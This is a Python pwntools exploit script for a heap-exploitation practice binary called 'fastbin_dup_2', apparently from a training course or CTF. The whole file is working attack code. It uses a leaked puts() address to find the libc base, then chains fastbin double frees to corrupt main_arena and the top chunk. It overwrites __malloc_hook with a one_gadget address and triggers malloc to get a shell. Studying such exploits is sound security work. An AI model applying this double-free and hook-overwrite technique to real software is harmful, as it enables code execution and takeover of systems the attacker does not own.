#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup_2")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Request two 0x50-sized chunks.
chunk_A = malloc(0x48, b"A"*8)
chunk_B = malloc(0x48, b"B"*8)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

malloc(0x48, p64(0x61))
malloc(0x48, b"C"*0x48)
malloc(0x48, b"D"*0x48)

# other fastbin dup
chunk_E = malloc(0x58, b"E"*0x58)
chunk_F = malloc(0x58, b"F"*0x58)

free(chunk_E)
free(chunk_F)
free(chunk_E)

malloc(0x58, p64(libc.sym.main_arena + 0x20))
# malloc(0x58, b"G"*0x58)
malloc(0x58, b"-s\x00")
malloc(0x58, b"H"*0x58)

# over_write the top_chunk
malloc(0x58, b"Y"*0x30 + p64(libc.sym.__malloc_hook - 35))
# malloc(0x58, b"Y"*0x30 + p64(0xdeadbeef))

# malloc fake chunk
malloc(0x28, b"Z"*0x13 + p64(libc.address + 0xe1fa1))
# malloc(0x28, b"Z"*0x13 + p64(0xdeadbeef))

# drop a shell
malloc(0x10, b"")



# =============================================================================

io.interactive()
